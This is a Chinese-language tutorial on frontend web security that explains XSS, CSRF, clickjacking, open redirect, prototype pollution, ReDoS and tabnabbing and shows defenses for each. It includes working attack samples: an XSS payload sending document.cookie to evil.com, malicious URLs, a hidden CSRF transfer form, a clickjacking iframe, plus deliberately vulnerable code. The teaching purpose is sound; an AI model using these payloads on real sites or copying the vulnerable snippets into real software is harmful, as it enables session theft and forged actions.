---
title: '前端安全完全指南'
publishDate: '2026-03-09 08:00:00'
description: '深入理解前端常见安全问题：XSS、CSRF、点击劫持等攻击与防御'
tags:
  - Browser
  - Security
language: 'zh-CN'
---

## 前端安全概览

前端安全是 Web 应用安全的第一道防线。虽然后端安全同样重要，但前端作为用户直接交互的界面，面临着独特的安全挑战。本文将从最常见的安全威胁开始，逐步深入到各类攻击手段及其防御策略。

前端安全问题主要分为三大类：
- **注入攻击**：XSS、SQL 注入等
- **会话劫持**：CSRF、Session 劫持等
- **界面欺骗**：点击劫持、钓鱼攻击等

## XSS（跨站脚本攻击）

XSS 是前端最常见也是危害最大的安全问题之一。攻击者通过注入恶意脚本，在用户浏览器中执行任意代码。

### XSS 的三种类型

#### 1. 存储型 XSS（Stored XSS）

最危险的 XSS 类型。恶意脚本被永久存储在服务器（数据库、文件系统等），每次用户访问都会触发。

```javascript
// 危险示例：直接渲染用户输入
function renderComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${comment.content}</p>
    </div>
  `;
}

// 攻击者提交的评论内容
const maliciousComment = {
  content: '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">'
};
```

#### 2. 反射型 XSS（Reflected XSS）

恶意脚本通过 URL 参数传递，服务器将其反射回页面。常见于搜索功能。

```javascript
// 危险示例：直接显示 URL 参数
const searchQuery = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = `搜索结果：${searchQuery}`;

// 攻击 URL
// https://example.com/search?q=<script>alert(document.cookie)</script>
```

#### 3. DOM 型 XSS（DOM-based XSS）

完全发生在客户端，不经过服务器。通过操作 DOM 执行恶意代码。

```javascript
// 危险示例：直接使用 location.hash
const userInput = location.hash.slice(1);
document.getElementById('content').innerHTML = userInput;

// 攻击 URL
// https://example.com/#<img src=x onerror=alert(1)>
```

### XSS 防御策略

#### 1. 输入验证与过滤

```javascript
// 白名单验证
function sanitizeInput(input) {
  const allowedTags = ['b', 'i', 'em', 'strong'];
  // 使用 DOMPurify 等库进行清理
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: allowedTags });
}
```

#### 2. 输出编码

```javascript
// HTML 实体编码
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 安全渲染
function renderComment(comment) {
  const div = document.createElement('div');
  div.textContent = comment.content; // 自动编码
  document.getElementById('comments').appendChild(div);
}
```

#### 3. Content Security Policy (CSP)

```html
<!-- 在 HTTP 头或 meta 标签中设置 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'">
```

```javascript
// 服务器端设置
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' 'nonce-random123'"
);
```

#### 4. HttpOnly Cookie

```javascript
// 服务器端设置
res.cookie('sessionId', token, {
  httpOnly: true,  // JavaScript 无法访问
  secure: true,    // 仅 HTTPS 传输
  sameSite: 'strict'
});
```

## CSRF（跨站请求伪造）

CSRF 攻击利用用户已登录的身份，诱导用户在不知情的情况下执行非预期操作。

### CSRF 攻击原理

```html
<!-- 攻击者网站上的恶意代码 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 或使用自动提交的表单 -->
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

### CSRF 防御策略

#### 1. CSRF Token

```javascript
// 服务器生成 token
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// 前端在请求中携带
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'user', amount: 100 })
});
```

#### 2. SameSite Cookie

```javascript
// 服务器设置
res.cookie('sessionId', token, {
  sameSite: 'strict', // 或 'lax'
  secure: true,
  httpOnly: true
});
```

#### 3. 验证 Referer/Origin

```javascript
// 服务器端验证
app.use((req, res, next) => {
  const origin = req.get('origin');
  const referer = req.get('referer');

  if (!origin || !origin.startsWith('https://trusted-domain.com')) {
    return res.status(403).send('Forbidden');
  }
  next();
});
```

#### 4. 双重 Cookie 验证

```javascript
// 前端从 Cookie 读取 token 并放入请求头
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrf_token='))
  ?.split('=')[1];

fetch('/api/action', {
  headers: { 'X-CSRF-Token': csrfToken }
});
```

## 点击劫持（Clickjacking）

攻击者通过透明 iframe 覆盖在正常页面上，诱导用户点击。

### 攻击示例

```html
<!-- 攻击者页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    opacity: 0.0001;
    z-index: 9999;
  }
</style>
<iframe src="https://bank.com/transfer"></iframe>
<button>点击领取奖品</button>
```

### 防御策略

#### 1. X-Frame-Options

```javascript
// 服务器端设置
res.setHeader('X-Frame-Options', 'DENY'); // 或 'SAMEORIGIN'
```

#### 2. CSP frame-ancestors

```javascript
res.setHeader(
  'Content-Security-Policy',
  "frame-ancestors 'none'" // 或 'self'
);
```

#### 3. JavaScript 防御

```javascript
// 检测是否被嵌入
if (top !== self) {
  top.location = self.location;
}
```

## 其他常见安全问题

### 1. 开放重定向（Open Redirect）

```javascript
// 危险示例
const redirect = new URLSearchParams(location.search).get('redirect');
location.href = redirect; // 可能跳转到钓鱼网站

// 安全做法：白名单验证
const allowedDomains = ['example.com', 'trusted.com'];
const url = new URL(redirect);
if (allowedDomains.includes(url.hostname)) {
  location.href = redirect;
}
```

### 2. 不安全的第三方依赖

```bash
# 定期检查依赖漏洞
npm audit
npm audit fix

# 使用 Snyk 等工具
npx snyk test
```

### 3. 敏感信息泄露

```javascript
// 危险：在前端暴露敏感信息
const config = {
  apiKey: 'sk-1234567890abcdef', // ❌
  dbPassword: 'secret123'         // ❌
};

// 安全做法：使用环境变量和后端代理
const config = {
  apiEndpoint: '/api/proxy' // ✅ 后端处理认证
};
```

### 4. 不安全的随机数

```javascript
// 危险：Math.random() 不适合安全场景
const token = Math.random().toString(36); // ❌

// 安全做法：使用 crypto API
const array = new Uint8Array(32);
crypto.getRandomValues(array);
const token = Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
```

## 不太常见但值得注意的问题

### 1. Prototype Pollution

```javascript
// 攻击示例
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, payload);
// 现在所有对象都有 isAdmin 属性

// 防御：使用 Object.create(null) 或冻结原型
const safeObj = Object.create(null);
```

### 2. ReDoS（正则表达式拒绝服务）

```javascript
// 危险的正则表达式
const regex = /^(a+)+$/;
regex.test('aaaaaaaaaaaaaaaaaaaaaaaaaaab'); // 可能导致卡死

// 使用简单的正则或限制输入长度
```

### 3. Tabnabbing

```html
<!-- 危险：新窗口可以修改原页面 -->
<a href="https://evil.com" target="_blank">链接</a>

<!-- 安全做法 -->
<a href="https://example.com" target="_blank" rel="noopener noreferrer">链接</a>
```

### 4. MIME 类型混淆

```javascript
// 服务器端设置正确的 Content-Type
res.setHeader('Content-Type', 'application/json');
res.setHeader('X-Content-Type-Options', 'nosniff');
```

## 安全开发最佳实践

### 1. 纵深防御

不要依赖单一防御措施，而是多层防护：
- 前端验证 + 后端验证
- CSP + 输出编码
- CSRF Token + SameSite Cookie

### 2. 最小权限原则

```javascript
// 只请求必要的权限
navigator.permissions.query({ name: 'geolocation' });

// Cookie 设置最小作用域
res.cookie('token', value, {
  path: '/api',        // 限制路径
  domain: 'api.example.com', // 限制域名
  maxAge: 3600000      // 限制时间
});
```

### 3. 安全的默认配置

```javascript
// 使用安全的框架默认配置
// React 自动转义
<div>{userInput}</div> // ✅ 安全

// Vue 也会自动转义
<div>{{ userInput }}</div> // ✅ 安全

// 危险的 API 需要显式使用
<div dangerouslySetInnerHTML={{__html: userInput}} /> // ⚠️ 需谨慎
```

### 4. 持续监控与更新

```javascript
// 使用 CSP 报告功能
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// 监听安全事件
window.addEventListener('securitypolicyviolation', (e) => {
  console.error('CSP violation:', e.violatedDirective);
  // 上报到监控系统
});
```

## 总结

前端安全是一个持续演进的领域。核心原则是：
- **永远不要信任用户输入**
- **使用成熟的安全库和框架**
- **保持依赖更新**
- **实施多层防御**

记住，安全不是一次性的工作，而是需要贯穿整个开发生命周期的持续实践。